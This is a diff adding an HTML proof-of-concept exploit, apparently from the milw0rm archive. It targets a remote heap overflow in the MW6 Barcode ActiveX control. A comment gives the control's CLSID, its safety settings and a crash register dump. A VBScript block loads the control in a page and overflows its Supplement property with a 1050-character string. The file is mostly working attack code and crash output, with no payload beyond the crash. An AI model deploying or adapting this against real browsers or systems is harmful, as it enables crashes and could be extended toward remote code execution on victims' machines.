@@ -1,0 +1,46 @@
+<html>
+-----------------------------------------------------------	<br/>
+Author : Houssamix 										   	<br/>
+-----------------------------------------------------------	<br/>
+MW6 Barcode ActiveX (Barcode.dll) Reamote Heap Overflow Poc	<br/>
+-----------------------------------------------------------	<br/>
+<!--
+
+http://www.mw6tech.com/download.html
+
+Report for Clsid: {14D09688-CFA7-11D5-995A-005004CE563B}		
+RegKey Safe for Script: Faux 									
+RegKey Safe for Init: Faux										
+Implements IObjectSafety: Vrai		 							
+IDisp Safe:  Safe for untrusted: caller,data						
+IPersist Safe:  Safe for untrusted: caller,data  					
+IPStorage Safe:  Safe for untrusted: caller,data  					
+
+Registers:															
+--------------------------------------------------					
+EIP 00B5294E														
+EAX 41414141 <==== 							 				   		
+EBX 00038660 														
+ECX 00FA1EF8 														 
+EDX 00030608 														
+EDI 00000000													
+ESI 00FA1EF8 														 
+EBP 0013F2A0 														
+ESP 0013F278 
+
+Block Disassembly: 
+--------------------------------------------------
+B5294E	MOV ECX,[EAX]	  <--- CRASH											
+-->
+
+<object classid='clsid:14D09688-CFA7-11D5-995A-005004CE563B' id='target' ></object>
+<script language='vbscript'>
+
+
+arg1=String(1050, "A")
+
+target.Supplement = arg1
+
+</script>
+
+# milw0rm.com [2009-01-26]
